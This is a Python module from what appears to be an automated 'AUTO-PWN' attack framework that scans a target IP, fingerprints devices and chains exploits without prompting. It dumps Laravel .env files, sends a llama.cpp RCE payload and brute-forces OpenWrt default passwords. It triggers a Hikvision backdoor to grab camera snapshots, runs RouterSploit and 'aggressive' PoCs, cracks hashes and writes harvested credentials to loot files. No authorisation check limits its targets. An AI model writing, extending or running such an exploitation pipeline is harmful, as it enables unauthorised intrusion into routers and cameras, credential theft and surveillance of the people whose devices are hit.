"""
Deep scan extras — full device-engine + OSINT + recon merged into classic Phase 0/1/3.
Non-interactive (no input prompts). Used only when scan profile is ``deep``.
"""

from __future__ import annotations

import json
import os
import re
from typing import Any

from engines.credential_hunter import (
    hunt_hikvision_credentials,
    hunt_web_router_credentials,
    parse_ingram_results,
)
from engines.device_cve_checker import assess_device, print_cve_report, probe_hikvision_backdoor
from engines.external_tools import ExternalTools
from engines.fingerprinter import Fingerprinter
from engines.hikvision_module import HikvisionExploiter
from engines.hikvision_snapshots import DEFAULT_PASSWORD
from engines.integration import (
    CAMERA_DEVICE_TYPES,
    ROUTER_DEVICE_TYPES,
    _pick_web_ports,
    _set_workspace,
)
from engines.loot_report import LootEntry, LootReport
from engines.laravel_module import LaravelExploiter
from engines.llama_cpp_module import LlamaCppExploiter
from engines.scanner import Scanner
from engines.utils import log, save_success
from engines.zte_module import ZTEExploiter


def _is_ip(host: str) -> bool:
    return bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", host.strip()))


def _save_json(path: str, data: dict) -> None:
    os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2, ensure_ascii=False)


def run_deep_osint_phase(ip: str, target_dir: str, hints: dict | None = None) -> dict[str, Any]:
    """Shodan + optional social OSINT from hints (email/phone in URL)."""
    out: dict[str, Any] = {"shodan": {}, "social": None}
    hints = hints or {}

    try:
        from engines.osint_engine import OSINTEngine

        osint = OSINTEngine(ip)
        out["shodan"] = osint.run_shodan_scan()
        _save_json(os.path.join(target_dir, "SHODAN_OSINT.json"), out["shodan"])
    except Exception as exc:
        log(f"[Deep] Shodan OSINT skipped: {exc}", "WARNING")

    raw = hints.get("raw") or hints.get("seed_url") or ""
    try:
        from core.telegram_extras import detect_osint_message

        detected = detect_osint_message(raw)
        if detected:
            kind, value = detected
            from core.telegram_extras import run_osint_action

            log(f"[Deep] Social OSINT ({kind}): {value}", "INFO")
            out["social"] = {"kind": kind, "text": run_osint_action(kind, value)}
            _save_json(os.path.join(target_dir, "SOCIAL_OSINT.json"), out["social"])
    except Exception as exc:
        log(f"[Deep] Social OSINT skipped: {exc}", "WARNING")

    return out


def run_deep_domain_recon(ip: str, target_dir: str, hints: dict | None = None) -> dict[str, Any]:
    """Amass + theHarvester when target looks like a domain."""
    hints = hints or {}
    host = hints.get("host") or hints.get("domain") or ip
    if _is_ip(host):
        return {}

    try:
        from engines.recon_agent import ReconAgent

        log(f"[Deep] Domain recon on {host}...", "INFO")
        agent = ReconAgent(host, target_dir)
        data = agent.execute()
        _save_json(os.path.join(target_dir, "DEEP_RECON.json"), data)
        return data
    except Exception as exc:
        log(f"[Deep] Domain recon skipped: {exc}", "WARNING")
        return {}


def _run_os_cve_nuclei(ip: str, port: int, target_url: str, os_family: str, scanner: Scanner, loot: LootReport) -> int:
    hits = 0
    data_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "data")
    cve_db_path = os.path.join(data_dir, "latest_cves.json")
    if not os.path.isfile(cve_db_path):
        return 0
    try:
        with open(cve_db_path, "r", encoding="utf-8") as fh:
            all_cves = json.load(fh)
        os_cves = list(all_cves.get(os_family, [])) + list(all_cves.get("GENERIC", []))
        for entry in os_cves:
            for tmpl in entry.get("nuclei_templates", []):
                finding = scanner.scan_specific_template(target_url, tmpl)
                if finding:
                    hits += 1
                    tid = finding.get("template-id", tmpl) if isinstance(finding, dict) else str(finding)
                    loot.add_note(f"OS CVE ({os_family}): {tid}")
    except Exception as exc:
        log(f"[Deep] OS CVE nuclei error: {exc}", "WARNING")
    return hits


def _run_hash_cracker(ip: str, target_dir: str, loot: LootReport) -> None:
    hash_path = os.path.join(target_dir, "hashes.txt")
    if not os.path.isfile(hash_path):
        return
    try:
        from engines.hash_cracker import HashCracker

        cracker = HashCracker(ip)
        cracked = cracker.crack_hashes(hash_path)
        if cracked:
            for pw in cracked:
                loot.add_note(f"John cracked: {pw}")
                log(f"[Deep] Cracked hash password: {pw}", "PWN")
    except Exception as exc:
        log(f"[Deep] Hash cracker skipped: {exc}", "WARNING")


def run_deep_poc_arsenal(
    ip: str,
    target_dir: str,
    web_ports: list[int] | None = None,
    device_type: str = "UNKNOWN",
) -> list[dict]:
    """Run matching + aggressive PoCs from scripts/new_pocs/ (deep scan only)."""
    from engines.poc_runner import PoCRunner

    ports = web_ports or [80, 443]
    all_results: list[dict] = []
    dt_map = {
        "router": "GENERIC_ROUTER",
        "web_server": "UNKNOWN",
        "fortinet_gateway": "GENERIC_ROUTER",
        "hybrid_web_fortinet": "GENERIC_ROUTER",
    }
    engine_dt = dt_map.get(device_type, device_type.upper().replace(" ", "_"))

    for port in ports[:6]:
        runner = PoCRunner(ip, port)
        matched = runner.run_matching(engine_dt, min_score=1, limit=8)
        aggressive = runner.run_aggressive(limit=10)
        for r in matched + aggressive:
            all_results.append(r)
            if r.get("success"):
                _save_json(
                    os.path.join(target_dir, "POC_SUCCESS.json"),
                    {"ip": ip, "port": port, "results": all_results},
                )
    return [r for r in all_results if r.get("success")]


def run_full_device_engine(
    ip: str,
    target_dir: str,
    web_ports: list[int] | None = None,
    profile: dict | None = None,
    hints: dict | None = None,
    osint_ports: list[int] | None = None,
) -> dict[str, Any]:
    """
    Full AUTO-PWN device pass (all modules from auto_pwn_main), non-interactive.
    """
    _set_workspace(target_dir)
    os.makedirs("db", exist_ok=True)
    hints = hints or {}

    ports = _pick_web_ports(web_ports, profile)
    if osint_ports:
        ports = sorted(set(ports) | set(int(p) for p in osint_ports if p))

    scanner = Scanner()
    live = scanner.discover_ports(ip)
    ports = sorted(set(ports) | set(live))
    if not ports:
        ports = [80]

    loot = LootReport(ip)
    loot.open_ports = ports
    ext = ExternalTools(ip)
    summary: dict[str, Any] = {
        "ip": ip,
        "exploited": False,
        "device_type": "UNKNOWN",
        "credentials": [],
        "cve_notes": [],
        "files": [],
        "deep": True,
    }

    log(f"\n>>> DEEP DEVICE ENGINE (full merge): {ip} ports {ports} <<<", "SUCCESS")

    for port in ports:
        target_url = f"https://{ip}:{port}" if port in (443, 8443) else f"http://{ip}:{port}"

        fp = Fingerprinter(target_url)
        fp_info = fp.identify_details()
        device_type = fp_info["device_type"]
        device_model = fp_info.get("model", "")

        if device_type == "UNKNOWN" and probe_hikvision_backdoor(ip, port):
            device_type = "HIKVISION"

        is_camera = device_type in CAMERA_DEVICE_TYPES
        is_router = device_type in ROUTER_DEVICE_TYPES
        router_pwned = False
        camera_handled = False

        os_result = scanner.detect_os_with_nmap(ip)
        os_family = os_result.get("os_family", "UNKNOWN_OS")
        if device_type == "UNKNOWN" and os_family in ("WINDOWS", "LINUX", "MACOS", "UNIX"):
            device_type = os_family

        device_intel = assess_device(ip, port, device_type, device_model, fp_info.get("server", ""))
        print_cve_report(device_intel)

        # Laravel / llama / ZTE / OpenWrt specialized
        if device_type == "LARAVEL":
            try:
                lex = LaravelExploiter(target_url)
                if lex.dump_env():
                    summary["exploited"] = True
                    loot.add_note("Laravel .env dumped")
            except Exception as exc:
                log(f"[Deep] Laravel: {exc}", "WARNING")

        if device_type == "LLAMA_CPP":
            try:
                if LlamaCppExploiter(ip, port).run_exploit():
                    summary["exploited"] = True
                    loot.add_note("llama.cpp RCE payload sent")
            except Exception as exc:
                log(f"[Deep] llama.cpp: {exc}", "WARNING")

        if device_type == "ZTE":
            try:
                ZTEExploiter(target_url).run_exploit()
            except Exception as exc:
                log(f"[Deep] ZTE: {exc}", "WARNING")

        if device_type == "OPENWRT":
            try:
                from engines.browser_automation import BrowserAutomation

                browser = BrowserAutomation()
                for pw in ("admin", "password", "12345", DEFAULT_PASSWORD):
                    if browser.auto_login_openwrt(target_url, pw):
                        loot.add(
                            LootEntry(
                                ip=ip, port=port, device_type="OPENWRT", model=device_model,
                                username="admin", password=pw, auth_method="LuCI login",
                            )
                        )
                        summary["exploited"] = True
                        router_pwned = True
                        break
            except Exception as exc:
                log(f"[Deep] OpenWrt browser: {exc}", "WARNING")

        if not is_camera and (is_router or device_type == "UNKNOWN"):
            entry = hunt_web_router_credentials(ip, port, device_type)
            if entry:
                loot.add(entry)
                save_success(ip, f"Web ({port})", entry.creds_display())
                summary["credentials"].append(entry.creds_display())
                summary["exploited"] = True
                router_pwned = True

        if device_type == "HIKVISION" or (device_type == "UNKNOWN" and probe_hikvision_backdoor(ip, port)):
            device_type = "HIKVISION"
            camera_handled = True
            hexp = HikvisionExploiter(target_url)
            hik_users, hik_passwords = hexp.run_backdoor()
            cred_entry = hunt_hikvision_credentials(ip, hik_users, hik_passwords, port)
            if cred_entry:
                loot.add(cred_entry)
                save_success(ip, f"Hikvision ({port})", cred_entry.creds_display())
                summary["credentials"].append(cred_entry.creds_display())
                summary["exploited"] = True
            elif getattr(hexp, "backdoor_active", False):
                summary["exploited"] = True
            try:
                from engines.camera_viewer import CameraViewer

                use_backdoor = not cred_entry and getattr(hexp, "backdoor_active", False)
                cam = CameraViewer(
                    ip,
                    cred_entry.username if cred_entry else "admin",
                    cred_entry.password if cred_entry else "11",
                    use_backdoor_auth=use_backdoor,
                )
                for p in cam.take_snapshots():
                    loot.add_file(p)
                    summary["files"].append(p)
            except Exception as exc:
                log(f"[Deep] snapshots: {exc}", "WARNING")

        if os_family != "UNKNOWN_OS" and device_type in ("WINDOWS", "LINUX", "MACOS", "UNIX", "UNKNOWN"):
            if _run_os_cve_nuclei(ip, port, target_url, os_family, scanner, loot):
                summary["exploited"] = True

        if not router_pwned and not is_camera and (is_router or device_type == "UNKNOWN"):
            try:
                vulns = ext.run_routersploit_scan()
                for vuln in vulns:
                    if ext.run_routersploit_exploit(vuln):
                        summary["exploited"] = True
                        loot.add_note(f"RouterSploit exploit: {vuln}")
            except Exception as exc:
                log(f"[Deep] RouterSploit: {exc}", "WARNING")

        if not camera_handled and (is_camera or device_type == "UNKNOWN" or port in (554, 8000, 8080, 37777)):
            try:
                ext.run_ingram_scan()
                for ingram_entry in parse_ingram_results(ip):
                    loot.add(ingram_entry)
                    summary["credentials"].append(ingram_entry.creds_display())
                    summary["exploited"] = True
                    camera_handled = True
            except Exception as exc:
                log(f"[Deep] Ingram: {exc}", "WARNING")

        if device_intel.assessments:
            for h in scanner.scan_cve_intel(target_url, device_intel):
                tid = h.get("template-id", "?") if isinstance(h, dict) else str(h)
                summary["cve_notes"].append(tid)

        try:
            from engines.fuzzer_module import Fuzzer

            found = Fuzzer(target_url.rstrip("/")).run()
            if found:
                loot.add_note(f"Fuzzer paths: {', '.join(found[:8])}")
        except Exception as exc:
            log(f"[Deep] Fuzzer: {exc}", "WARNING")

        summary["device_type"] = device_type
        if router_pwned and camera_handled:
            break

    _run_hash_cracker(ip, target_dir, loot)

    loot_path = os.path.join(target_dir, "ENGINE_LOOT.json")
    payload = {
        "summary": summary,
        "loot": {
            "entries": [
                {
                    "port": e.port,
                    "device_type": e.device_type,
                    "model": e.model,
                    "username": e.username,
                    "password": e.password,
                    "auth_method": e.auth_method,
                }
                for e in loot.entries
            ],
            "files": loot.files,
            "notes": loot.notes,
        },
    }
    with open(loot_path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2, ensure_ascii=False)

    loot.print_final()
    log(f"[Deep] Full engine loot: {loot_path}", "SUCCESS")
    return summary
